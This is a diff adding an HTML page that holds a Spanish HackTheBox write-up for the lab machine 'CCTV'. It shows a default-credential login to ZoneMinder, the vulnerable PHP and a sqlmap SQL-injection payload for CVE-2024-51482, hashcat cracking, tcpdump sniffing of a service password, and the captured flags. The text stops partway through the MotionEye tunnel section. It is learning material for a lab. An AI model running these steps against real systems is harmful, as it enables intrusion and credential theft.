@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CCTV — HTB Writeup | Yoandy Ramirez Delgado</title>
+<style>
+  :root {
+    --accent: #4ade80;
+    --accent-dim: #16a34a;
+    --accent-glow: rgba(74,222,128,0.15);
+    --bg: #0a0e1a;
+    --bg2: #0f1629;
+    --bg3: #141d35;
+    --card: #111827;
+    --card2: #1a2540;
+    --border: #1e2d4a;
+    --text: #e2e8f0;
+    --text-muted: #64748b;
+    --text-dim: #94a3b8;
+    --red: #f87171;
+    --yellow: #fbbf24;
+    --blue: #60a5fa;
+    --purple: #a78bfa;
+    --orange: #fb923c;
+    --cyan: #22d3ee;
+    --green: #4ade80;
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+    font-size: 15px;
+  }
+
+  /* HERO */
+  .hero {
+    background: linear-gradient(135deg, #0a0e1a 0%, #0d1a2b 40%, #091a10 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 60px 40px 50px;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::before {
+    content: '';
+    position: absolute; top: -60px; right: -60px;
+    width: 400px; height: 400px;
+    background: radial-gradient(circle, rgba(74,222,128,0.07) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero::after {
+    content: '>';
+    position: absolute; bottom: 20px; right: 40px;
+    font-size: 140px; font-family: monospace;
+    color: rgba(74,222,128,0.04); pointer-events: none;
+  }
+  .hero-inner { max-width: 1200px; margin: 0 auto; }
+  .hero-meta { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
+  .tag {
+    display: inline-flex; align-items: center; gap: 5px;
+    padding: 3px 10px; border-radius: 4px;
+    font-size: 11px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase;
+  }
+  .tag-platform { background: rgba(74,222,128,0.12); color: var(--accent); border: 1px solid rgba(74,222,128,0.25); }
+  .tag-category { background: rgba(96,165,250,0.1); color: var(--blue); border: 1px solid rgba(96,165,250,0.2); }
+  .tag-diff-medium { background: rgba(251,191,36,0.1); color: var(--yellow); border: 1px solid rgba(251,191,36,0.2); }
+  .tag-cve { background: rgba(248,113,113,0.1); color: var(--red); border: 1px solid rgba(248,113,113,0.2); }
+  .hero h1 { font-size: 2.8rem; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 14px; line-height: 1.1; }
+  .hero h1 span { color: var(--accent); }
+  .hero-sub { color: var(--text-dim); font-size: 1.05rem; max-width: 680px; margin-bottom: 28px; line-height: 1.6; }
+  .hero-stats { display: flex; gap: 28px; flex-wrap: wrap; }
+  .stat { display: flex; flex-direction: column; gap: 2px; }
+  .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); }
+  .stat-value { font-size: 1.1rem; font-weight: 700; color: var(--text); }
+  .stat-value.green { color: var(--accent); }
+  .stat-value.yellow { color: var(--yellow); }
+  .stat-value.red { color: var(--red); }
+
+  /* LAYOUT */
+  .container { max-width: 1200px; margin: 0 auto; padding: 40px; }
+  .grid { display: grid; grid-template-columns: 1fr 320px; gap: 32px; align-items: start; }
+
+  /* SIDEBAR */
+  .sidebar { position: sticky; top: 24px; display: flex; flex-direction: column; gap: 20px; }
+  .sidebar-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; }
+  .sidebar-card h4 { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); margin-bottom: 14px; font-weight: 700; }
+  .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 7px 0; border-bottom: 1px solid var(--border); font-size: 13px; }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-label { color: var(--text-muted); }
+  .detail-value { color: var(--text); font-weight: 600; text-align: right; max-width: 170px; }
+  .detail-value.green { color: var(--accent); }
+  .detail-value.red { color: var(--red); }
+  .detail-value.yellow { color: var(--yellow); }
+
+  .skill-item { margin-bottom: 12px; }
+  .skill-header { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 5px; }
+  .skill-name { color: var(--text-dim); }
+  .skill-pct { color: var(--accent); font-weight: 700; }
+  .skill-bar { height: 5px; background: var(--bg3); border-radius: 3px; overflow: hidden; }
+  .skill-fill { height: 100%; background: linear-gradient(90deg, var(--accent-dim), var(--accent)); border-radius: 3px; }
+
+  .tool-list { display: flex; flex-direction: column; gap: 8px; }
+  .tool-item { display: flex; align-items: center; gap: 10px; padding: 8px 10px; border-radius: 6px; background: var(--bg3); border: 1px solid var(--border); font-size: 12px; color: var(--text-dim); }
+  .tool-icon { font-size: 14px; }
+
+  .toc-list { list-style: none; display: flex; flex-direction: column; gap: 2px; }
+  .toc-list li a { display: block; padding: 6px 10px; border-radius: 5px; font-size: 12px; color: var(--text-muted); text-decoration: none; border-left: 2px solid transparent; transition: all 0.15s; }
+  .toc-list li a:hover { color: var(--accent); border-left-color: var(--accent); background: var(--accent-glow); }
+
+  .mitre-list { display: flex; flex-direction: column; gap: 6px; }
+  .mitre-item { display: flex; align-items: flex-start; gap: 8px; padding: 7px 10px; border-radius: 6px; background: var(--bg3); border: 1px solid var(--border); font-size: 11px; }
+  .mitre-id { color: var(--accent); font-family: monospace; font-weight: 700; white-space: nowrap; font-size: 11px; }
+  .mitre-name { color: var(--text-dim); line-height: 1.3; }
+
+  /* MAIN */
+  .section { margin-bottom: 48px; }
+  .section-header { display: flex; align-items: center; gap: 12px; margin-bottom: 22px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+  .section-number { width: 30px; height: 30px; border-radius: 6px; background: var(--accent-glow); border: 1px solid rgba(74,222,128,0.25); display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; color: var(--accent); flex-shrink: 0; }
+  .section h2 { font-size: 1.25rem; font-weight: 700; color: var(--text); }
+  .section p { color: var(--text-dim); margin-bottom: 14px; line-height: 1.8; }
+  .section p:last-child { margin-bottom: 0; }
+  .section h3 { font-size: 0.95rem; font-weight: 700; color: var(--text); margin: 20px 0 10px; }
+
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; margin-bottom: 16px; }
+  .card h3 { font-size: 0.95rem; font-weight: 700; color: var(--text); margin-bottom: 10px; }
+
+  .callout { border-radius: 8px; padding: 16px 18px; margin: 14px 0; display: flex; gap: 12px; align-items: flex-start; font-size: 13.5px; }
+  .callout-info { background: rgba(96,165,250,0.08); border: 1px solid rgba(96,165,250,0.2); }
+  .callout-warn { background: rgba(251,191,36,0.08); border: 1px solid rgba(251,191,36,0.2); }
+  .callout-danger { background: rgba(248,113,113,0.08); border: 1px solid rgba(248,113,113,0.2); }
+  .callout-tip { background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.2); }
+  .callout-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+  .callout-content { color: var(--text-dim); line-height: 1.6; }
+  .callout-content strong { color: var(--text); }
+
+  .code-block { background: #050810; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin: 14px 0; font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; }
+  .code-label { background: var(--bg3); border-bottom: 1px solid var(--border); padding: 6px 14px; font-size: 11px; color: var(--text-muted); display: flex; align-items: center; gap: 6px; }
+  .code-label span { color: var(--accent); font-weight: 600; }
+  .code-body { padding: 16px; font-size: 13px; color: #a3e635; overflow-x: auto; line-height: 1.7; }
+  .code-body .comment { color: var(--text-muted); }
+  .code-body .cmd { color: var(--accent); font-weight: 600; }
+  .code-body .param { color: var(--cyan); }
+  .code-body .ip { color: var(--orange); }
+  .code-body .user { color: var(--purple); }
+  .code-body .path { color: var(--blue); }
+  .code-body .highlight { color: var(--red); font-weight: 600; }
+  .code-body .ok { color: var(--green); }
+  .code-body .warn { color: var(--yellow); }
+  .code-body .flag { color: var(--accent); font-weight: 700; letter-spacing: 1px; }
+  .code-body .cred { color: var(--orange); font-weight: 700; }
+
+  .timeline { position: relative; padding-left: 28px; margin-top: 14px; }
+  .timeline::before { content: ''; position: absolute; left: 9px; top: 8px; bottom: 8px; width: 2px; background: var(--border); }
+  .tl-item { position: relative; margin-bottom: 24px; }
+  .tl-dot { position: absolute; left: -24px; top: 5px; width: 12px; height: 12px; border-radius: 50%; background: var(--bg); border: 2px solid var(--accent); }
+  .tl-dot.red { border-color: var(--red); }
+  .tl-dot.yellow { border-color: var(--yellow); }
+  .tl-dot.orange { border-color: var(--orange); }
+  .tl-dot.blue { border-color: var(--blue); }
+  .tl-dot.purple { border-color: var(--purple); }
+  .tl-dot.green { border-color: var(--green); }
+  .tl-phase { font-size: 10px; color: var(--text-muted); font-family: monospace; margin-bottom: 2px; text-transform: uppercase; letter-spacing: 1px; }
+  .tl-title { font-size: 0.9rem; font-weight: 700; color: var(--text); margin-bottom: 3px; }
+  .tl-desc { font-size: 12.5px; color: var(--text-dim); line-height: 1.5; }
+
+  .data-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 14px 0; }
+  .data-table th { background: var(--bg3); color: var(--text-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; padding: 10px 14px; border: 1px solid var(--border); font-weight: 600; text-align: left; }
+  .data-table td { padding: 10px 14px; border: 1px solid var(--border); color: var(--text-dim); vertical-align: top; }
+  .data-table tr:hover td { background: var(--bg3); }
+  .data-table code { font-family: monospace; font-size: 12px; color: var(--accent); background: rgba(74,222,128,0.08); padding: 1px 5px; border-radius: 3px; }
+
+  .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; }
+  .badge-red { background: rgba(248,113,113,0.12); color: var(--red); }
+  .badge-yellow { background: rgba(251,191,36,0.12); color: var(--yellow); }
+  .badge-blue { background: rgba(96,165,250,0.12); color: var(--blue); }
+  .badge-green { background: rgba(74,222,128,0.12); color: var(--green); }
+  .badge-orange { background: rgba(251,146,60,0.12); color: var(--orange); }
+  .badge-purple { background: rgba(167,139,250,0.12); color: var(--purple); }
+
+  .artifact-card { display: flex; align-items: flex-start; gap: 14px; background: var(--card2); border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 10px; }
+  .artifact-icon { font-size: 22px; flex-shrink: 0; }
+  .artifact-name { font-size: 0.88rem; font-weight: 700; color: var(--accent); font-family: monospace; margin-bottom: 3px; }
+  .artifact-desc { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
+
+  .highlight-box { background: var(--card2); border: 1px solid var(--border); border-left: 4px solid var(--accent); border-radius: 8px; padding: 16px 18px; margin: 14px 0; }
+  .highlight-box .label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); margin-bottom: 6px; font-weight: 700; }
+  .highlight-box .value { font-family: monospace; font-size: 13px; color: var(--text); word-break: break-all; }
+
+  .vuln-box { background: linear-gradient(135deg, rgba(248,113,113,0.06), rgba(251,146,60,0.04)); border: 1px solid rgba(248,113,113,0.25); border-radius: 10px; padding: 20px; margin: 16px 0; }
+  .vuln-box .title { font-size: 0.95rem; font-weight: 700; color: var(--red); margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
+
+  .flag-box { border-radius: 10px; padding: 20px 24px; margin: 16px 0; display: flex; align-items: center; gap: 16px; }
+  .flag-user { background: rgba(74,222,128,0.06); border: 1px solid rgba(74,222,128,0.3); }
+  .flag-root { background: rgba(248,113,113,0.06); border: 1px solid rgba(248,113,113,0.3); }
+  .flag-emoji { font-size: 2em; flex-shrink: 0; }
+  .flag-label-txt { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-bottom: 4px; }
+  .flag-value { font-family: monospace; font-size: 1.05em; font-weight: 700; letter-spacing: 1px; word-break: break-all; }
+  .flag-user .flag-value { color: var(--accent); }
+  .flag-root .flag-value { color: var(--red); }
+
+  .rec-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 14px; }
+  .rec-card { background: var(--card2); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
+  .rec-title { font-size: 0.82rem; font-weight: 700; color: var(--text); margin-bottom: 6px; }
+  .rec-body { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
+
+  footer { background: var(--bg2); border-top: 1px solid var(--border); padding: 28px 40px; text-align: center; color: var(--text-muted); font-size: 13px; }
+  footer a { color: var(--accent); text-decoration: none; }
+  .footer-name { font-size: 0.95rem; font-weight: 700; color: var(--text); margin-bottom: 4px; }
+
+  @media (max-width: 900px) {
+    .grid { grid-template-columns: 1fr; }
+    .sidebar { position: static; }
+    .hero h1 { font-size: 2rem; }
+    .container { padding: 30px 20px; }
+    .hero { padding: 40px 20px; }
+    .rec-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<header class="hero">
+  <div class="hero-inner">
+    <div class="hero-meta">
+      <span class="tag tag-platform">HackTheBox</span>
+      <span class="tag tag-category">Pentesting</span>
+      <span class="tag tag-diff-medium">Medium</span>
+      <span class="tag tag-cve">CVE-2024-51482</span>
+      <span class="tag tag-cve">CVE-2025-60787</span>
+    </div>
+    <h1><span>CCTV</span> — SQLi, Sniffing &amp; MotionEye RCE</h1>
+    <p class="hero-sub">
+      Un sistema de videovigilancia corporativo expone ZoneMinder con credenciales por defecto. Una vulnerabilidad de SQL Injection filtra hashes de usuarios. El sniffing de red interna revela la contraseña de una cuenta de servicio. Un túnel SSH expone MotionEye — vulnerable a RCE — que entrega shell como root.
+    </p>
+    <div class="hero-stats">
+      <div class="stat"><span class="stat-label">Plataforma</span><span class="stat-value">HackTheBox</span></div>
+      <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Linux</span></div>
+      <div class="stat"><span class="stat-label">Dificultad</span><span class="stat-value yellow">Medium</span></div>
+      <div class="stat"><span class="stat-label">IP Objetivo</span><span class="stat-value">10.129.2.164</span></div>
+      <div class="stat"><span class="stat-label">User Flag</span><span class="stat-value green">&#10003; Obtenida</span></div>
+      <div class="stat"><span class="stat-label">Root Flag</span><span class="stat-value green">&#10003; Obtenida</span></div>
+    </div>
+  </div>
+</header>
+
+<div class="container">
+  <div class="grid">
+
+    <!-- MAIN -->
+    <main>
+
+      <!-- 1. DESCRIPCION -->
+      <section class="section" id="descripcion">
+        <div class="section-header">
+          <div class="section-number">1</div>
+          <h2>Descripción de la Máquina</h2>
+        </div>
+        <p>
+          CCTV es una máquina Linux de dificultad Media en HackTheBox. Simula un sistema de videovigilancia corporativo construido sobre dos plataformas open-source: <strong>ZoneMinder</strong> (interfaz pública) y <strong>MotionEye</strong> (servicio interno en Docker). La cadena de explotación combina vulnerabilidades conocidas con técnicas clásicas de post-explotación en entornos con Docker.
+        </p>
+        <p>
+          El vector inicial es una SQL Injection autenticada en ZoneMinder v1.37.63 (CVE-2024-51482). Las credenciales obtenidas permiten acceso SSH. Desde allí, el abuso de <code style="font-family:monospace;color:var(--accent)">cap_net_raw</code> en tcpdump revela la contraseña de un servicio interno en texto plano. La escalada final se produce explotando CVE-2025-60787 en MotionEye 0.43.1b4 mediante Metasploit.
+        </p>
+
+        <div class="callout callout-info">
+          <span class="callout-icon">&#128161;</span>
+          <div class="callout-content">
+            <strong>Concepto clave — Docker + tráfico interno:</strong> Los servicios dockerizados frecuentemente se comunican sin TLS en redes internas. Con <code style="font-family:monospace;color:var(--accent)">cap_net_raw</code> un usuario no-root puede capturar todo ese tráfico, exponiendo credenciales y tokens transmitidos en texto plano.
+          </div>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px;">
+          <div class="artifact-card">
+            <span class="artifact-icon">&#128247;</span>
+            <div>
+              <div class="artifact-name">ZoneMinder v1.37.63</div>
+              <div class="artifact-desc">Plataforma de CCTV expuesta públicamente. Login con credenciales por defecto. SQLi en parámetro <code style="font-family:monospace;color:var(--accent)">tid</code> (CVE-2024-51482).</div>
+            </div>
+          </div>
+          <div class="artifact-card">
+            <span class="artifact-icon">&#128250;</span>
+            <div>
+              <div class="artifact-name">MotionEye 0.43.1b4</div>
+              <div class="artifact-desc">App de gestión CCTV corriendo en Docker, accesible solo via localhost:8765. RCE como root via CVE-2025-60787.</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- 2. RECON -->
+      <section class="section" id="recon">
+        <div class="section-header">
+          <div class="section-number">2</div>
+          <h2>Reconocimiento</h2>
+        </div>
+
+        <h3>Escaneo de Puertos — Nmap</h3>
+        <p>Comenzamos con un escaneo completo de puertos en dos fases: descubrimiento rápido seguido de detección de servicios y versiones.</p>
+
+        <div class="code-block">
+          <div class="code-label"><span>nmap</span> — full port scan</div>
+          <div class="code-body"><span class="comment"># Fase 1: descubrimiento de puertos abiertos</span>
+<span class="cmd">$ nmap -sS -p- --open -T4 -n 10.129.2.164</span>
+
+<span class="comment"># Fase 2: detección de servicios y versiones</span>
+<span class="cmd">$ nmap -sC -sV -p 22,80 10.129.2.164</span>
+
+PORT   STATE SERVICE  VERSION
+<span class="ok">22/tcp open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14</span>
+<span class="ok">80/tcp open  http     Apache httpd 2.4.58</span>
+|_http-title: Did not follow redirect to http://cctv.htb/
+Service Info: Host: default; OS: Linux</div>
+        </div>
+
+        <div class="callout callout-warn">
+          <span class="callout-icon">&#9888;&#65039;</span>
+          <div class="callout-content">
+            <strong>Redirección a cctv.htb:</strong> Apache responde con un Virtual Host. Sin añadir el hostname a <code>/etc/hosts</code>, el servidor devuelve timeout. Paso obligatorio antes de continuar.
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-label"><span>bash</span> — /etc/hosts</div>
+          <div class="code-body"><span class="cmd">$ echo "10.129.2.164 cctv.htb" | sudo tee -a /etc/hosts</span>
+<span class="ok">10.129.2.164 cctv.htb</span>
+
+<span class="comment"># Verificar acceso</span>
+<span class="cmd">$ curl -s http://cctv.htb/ | grep -oE 'href="[^"]+"'</span>
+href="http://cctv.htb/zm"         <span class="comment">← ZoneMinder</span>
+href="mailto:info@cctv.htb"</div>
+        </div>
+
+        <p>La web principal es un sitio corporativo "SecureVision CCTV & Security Solutions". El botón <em>Staff Login</em> lleva a <code style="font-family:monospace;color:var(--accent)">/zm</code> — la interfaz de ZoneMinder.</p>
+      </section>
+
+      <!-- 3. ZONEMINDER -->
+      <section class="section" id="zoneminder">
+        <div class="section-header">
+          <div class="section-number">3</div>
+          <h2>ZoneMinder — Credenciales por Defecto &amp; SQLi</h2>
+        </div>
+
+        <h3>3.1 — Login con admin:admin</h3>
+        <p>ZoneMinder tiene credenciales por defecto ampliamente conocidas. Las probamos inmediatamente en <code style="font-family:monospace;color:var(--accent)">http://cctv.htb/zm/</code>:</p>
+
+        <div class="code-block">
+          <div class="code-label"><span>curl</span> — login ZoneMinder</div>
+          <div class="code-body"><span class="comment"># 1. Obtener cookie de sesión y token CSRF</span>
+<span class="cmd">$ curl -c cookies.txt "http://cctv.htb/zm/index.php?view=login" \
+  | grep csrfMagicToken</span>
+csrfMagicToken = "key:314a6d93...,1772968217"
+
+<span class="comment"># 2. Enviar login con CSRF token</span>
+<span class="cmd">$ curl -b cookies.txt -c cookies.txt -X POST "http://cctv.htb/zm/index.php" \
+  --data-urlencode "view=login" \
+  --data-urlencode "action=login" \
+  --data-urlencode "username=admin" \
+  --data-urlencode "password=admin" \
+  --data-urlencode "__csrf_magic=key:314a..."</span>
+
+<span class="ok">&lt;title&gt;ZM - Console&lt;/title&gt;  ← Login exitoso!</span>
+<span class="comment"># Versión revelada en consola: v1.37.63</span></div>
+        </div>
+
+        <h3>3.2 — CVE-2024-51482: SQL Injection en tid</h3>
+
+        <div class="vuln-box">
+          <div class="title">&#128683; CVE-2024-51482 — ZoneMinder SQL Injection</div>
+          <p style="color:var(--text-dim);font-size:13.5px;line-height:1.7;">El archivo <code style="font-family:monospace;color:var(--orange)">web/ajax/event.php</code> en la línea 217 asigna el parámetro <code style="font-family:monospace;color:var(--orange)">tid</code> del request directamente a <code style="font-family:monospace;color:var(--orange)">$tagId</code> sin sanitización. Mientras la primera query usa placeholders preparados, la segunda concatena el valor directamente en SQL:</p>
+          <div class="code-block" style="margin-top:12px;">
+            <div class="code-label"><span>PHP</span> — web/ajax/event.php:217 (vulnerable)</div>
+            <div class="code-body">case 'removetag':
+  <span class="highlight">$tagId = $_REQUEST['tid'];</span>  <span class="comment">// Sin sanitización</span>
+
+  <span class="comment">// Primera query — SEGURA (parametrizada)</span>
+  dbQuery('DELETE FROM Events_Tags WHERE TagId = ? AND EventId = ?',
+          array($tagId, $_REQUEST['id']));
+
+  <span class="comment">// Segunda query — VULNERABLE (concatenación directa)</span>
+  <span class="highlight">$sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId";</span>
+  $rowCount = dbNumRows($sql);  <span class="highlight">← SQLi aquí</span></div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-label"><span>sqlmap</span> — extracción de credenciales</div>
+          <div class="code-body"><span class="cmd">$ sqlmap -u "http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1&amp;id=1" \
+  --cookie "zmSkin=classic; zmCSS=base; ZMSESSID=n6rhknudonjn3qcea2hfaebuia" \
+  -p "tid" \
+  --batch \
+  --technique=T \
+  --time-sec=3 \
+  --predict-output \
+  -D zm -T Users -C Username,Password \
+  --dump</span>
+
+<span class="param">[INFO] GET parameter 'tid' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind' injectable</span>
+<span class="ok">[INFO] adjusting time delay to 1 second due to good response times</span>
+
+<span class="comment">--- Tipo de Inyección ---</span>
+Type: time-based blind
+Payload: tid=1 AND (SELECT 3086 FROM (SELECT(SLEEP(3)))dHht)
+
+<span class="comment">--- Resultados extraídos (zm.Users) ---</span>
+<span class="warn">Username: superadmin</span>
+<span class="warn">Password: $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm</span>
+<span class="ok">Username: mark</span>
+<span class="ok">Password: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.</span></div>
+        </div>
+      </section>
+
+      <!-- 4. HASH CRACKING -->
+      <section class="section" id="hashcrack">
+        <div class="section-header">
+          <div class="section-number">4</div>
+          <h2>Hash Cracking — mark:opensesame</h2>
+        </div>
+
+        <p>Tenemos dos hashes bcrypt (<code style="font-family:monospace;color:var(--accent)">$2y$</code>). Usamos <strong>hashcat</strong> en modo 3200 con <code style="font-family:monospace;color:var(--accent)">rockyou.txt</code>:</p>
+
+        <div class="code-block">
+          <div class="code-label"><span>hashcat</span> — modo 3200 (bcrypt)</div>
+          <div class="code-body"><span class="cmd">$ hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt</span>
+
+<span class="flag">$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame</span>
+
+Session..........: hashcat
+Status...........: <span class="ok">Cracked</span>
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish)
+<span class="comment"># superadmin: hash no crackeado con rockyou</span></div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-label"><span>SSH</span> — mark@cctv.htb</div>
+          <div class="code-body"><span class="cmd">$ sshpass -p 'opensesame' ssh mark@cctv.htb</span>
+
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
+
+<span class="user">mark@cctv</span>:~$ <span class="cmd">id</span>
+<span class="ok">uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)</span>
+
+<span class="user">mark@cctv</span>:~$ <span class="cmd">ls /home/</span>
+mark  sa_mark     <span class="comment">← objetivo: sa_mark</span></div>
+        </div>
+
+        <div class="callout callout-warn">
+          <span class="callout-icon">&#128269;</span>
+          <div class="callout-content">
+            <strong>No hay user.txt en /home/mark.</strong> El flag de usuario está en el home de <code>sa_mark</code> — una cuenta de servicio que aún necesitamos comprometer.
+          </div>
+        </div>
+      </section>
+
+      <!-- 5. ENUMERACION -->
+      <section class="section" id="enumeracion">
+        <div class="section-header">
+          <div class="section-number">5</div>
+          <h2>Enumeración Post-Explotación como mark</h2>
+        </div>
+
+        <p>Realizamos enumeración del sistema buscando vías de escalada de privilegios: capabilities, puertos internos y logs.</p>
+
+        <div class="code-block">
+          <div class="code-label"><span>bash</span> — enumeración del sistema</div>
+          <div class="code-body"><span class="comment"># Linux capabilities en binarios</span>
+<span class="user">mark@cctv</span>:~$ <span class="cmd">getcap /usr/bin/tcpdump</span>
+<span class="highlight">/usr/bin/tcpdump cap_net_raw=eip</span>  <span class="comment">← captura de paquetes sin root!</span>
+
+<span class="comment"># Puertos en escucha (localhost)</span>
+<span class="user">mark@cctv</span>:~$ <span class="cmd">ss -tlnp</span>
+127.0.0.1:<span class="warn">5000</span>   <span class="comment">← Flask interno (sa_mark se autentica aquí)</span>
+127.0.0.1:<span class="warn">8765</span>   <span class="comment">← MotionEye (objetivo para root)</span>
+127.0.0.1:3306   ← MySQL
+0.0.0.0:22       ← SSH
+
+<span class="comment"># Log de actividad de sa_mark</span>
+<span class="user">mark@cctv</span>:~$ <span class="cmd">cat /opt/video/backups/server.log</span>
+Authorization as sa_mark successful. Command issued: status. Outcome: success.
+Authorization as sa_mark successful. Command issued: disk-info. Outcome: success.
+<span class="comment">↑ Un servicio se autentica como sa_mark cada ~1 minuto</span>
+
+<span class="comment"># Interfaces de red (Docker bridges)</span>
+<span class="user">mark@cctv</span>:~$ <span class="cmd">ip -4 addr show</span>
+<span class="path">br-1b6b4b93c636</span>: 172.25.0.1/16   <span class="comment">← red Docker interna</span>
+<span class="path">br-3e74116c4022</span>: 172.18.0.1/16   <span class="comment">← red Docker interna</span></div>
+        </div>
+
+        <div class="callout callout-danger">
+          <span class="callout-icon">&#128683;</span>
+          <div class="callout-content">
+            <strong>Attack Surface identificada:</strong> <code>tcpdump</code> con <code>cap_net_raw</code> + servicio interno autenticándose en puerto 5000 + tráfico Docker sin cifrar = credenciales expuestas.
+          </div>
+        </div>
+      </section>
+
+      <!-- 6. SNIFFING -->
+      <section class="section" id="sniffing">
+        <div class="section-header">
+          <div class="section-number">6</div>
+          <h2>Network Sniffing — Credencial de sa_mark</h2>
+        </div>
+
+        <p>El servicio Flask en el puerto 5000 recibe comandos periódicos desde un contenedor Docker con autenticación en texto plano. Capturamos ese tráfico con <code style="font-family:monospace;color:var(--accent)">tcpdump</code> y la capability <code style="font-family:monospace;color:var(--accent)">cap_net_raw</code>:</p>
+
+        <div class="code-block">
+          <div class="code-label"><span>tcpdump</span> — captura de credenciales en puerto 5000</div>
+          <div class="code-body"><span class="user">mark@cctv</span>:~$ <span class="cmd">tcpdump -i any -nn -A tcp port 5000 2>/dev/null | grep -a 'PASSWORD='</span>
+
+<span class="comment">[esperando tráfico...]</span>
+
+06:14:36 veth1a856e6 P IP 172.25.0.11.44992 → 172.25.0.10.5000 length 51
+<span class="flag">USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status</span>
+
+06:14:36 vethf64c125 Out IP 172.25.0.11.44992 → 172.25.0.10.5000 length 51
+<span class="flag">USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info</span></div>
+        </div>
+
+        <div class="highlight-box">
+          <div class="label">Credencial Capturada — sa_mark</div>
+          <div class="value">USERNAME=sa_mark | PASSWORD=<span style="color:var(--accent)">X1l9fx1ZjS7RZb</span></div>
+        </div>
+      </section>
+
+      <!-- 7. USER FLAG -->
+      <section class="section" id="userflag">
+        <div class="section-header">
+          <div class="section-number">7</div>
+          <h2>User Flag</h2>
+        </div>
+
+        <div class="code-block">
+          <div class="code-label"><span>SSH</span> — sa_mark@cctv.htb</div>
+          <div class="code-body"><span class="cmd">$ sshpass -p 'X1l9fx1ZjS7RZb' ssh sa_mark@cctv.htb</span>
+
+<span class="user">sa_mark@cctv</span>:~$ <span class="cmd">id</span>
+<span class="ok">uid=1001(sa_mark) gid=1001(sa_mark) groups=1001(sa_mark)</span>
+
+<span class="user">sa_mark@cctv</span>:~$ <span class="cmd">ls -la</span>
+-rw-r----- 1 root sa_mark    33 Mar  8 09:03 user.txt
+-rw-r--r-- 1 root root    29359 Nov  7        'SecureVision Staff Announcement.pdf'
+
+<span class="user">sa_mark@cctv</span>:~$ <span class="cmd">cat user.txt</span>
+<span class="flag">c75820cd752bcc53f37fa247322e3f76</span></div>
+        </div>
+
+        <div class="flag-box flag-user">
+          <span class="flag-emoji">&#128681;</span>
+          <div>
+            <div class="flag-label-txt">User Flag — /home/sa_mark/user.txt</div>
+            <div class="flag-value">c75820cd752bcc53f37fa247322e3f76</div>
+          </div>
+        </div>
+
+        <div class="callout callout-info">
+          <span class="callout-icon">&#128196;</span>
+          <div class="callout-content">
+            <strong>SecureVision Staff Announcement.pdf:</strong> El PDF encontrado en el home de sa_mark indica que "los logins del staff permanecerán igual" — pista de reutilización de contraseñas que se confirma en el siguiente paso con MotionEye.
+          </div>
+        </div>
+      </section>
+
+      <!-- 8. MOTIONEYE -->
+      <section class="section" id="motioneye">
+        <div class="section-header">
+          <div class="section-number">8</div>
+          <h2>MotionEye — SSH Tunnel &amp; Login</h2>
+        </div>
+
+        <p>MotionEye corre en <code style="font-family:monospace;color:var(--accent)">127.0.0.1:8765</code> — solo accesible desde la máquina víctima. Creamos un túnel SSH local para alcanzarlo:</p>
+
+        <div class="code-block">
+          <div class="code-label"><span>SSH</span> — Local Port Forwarding</div>
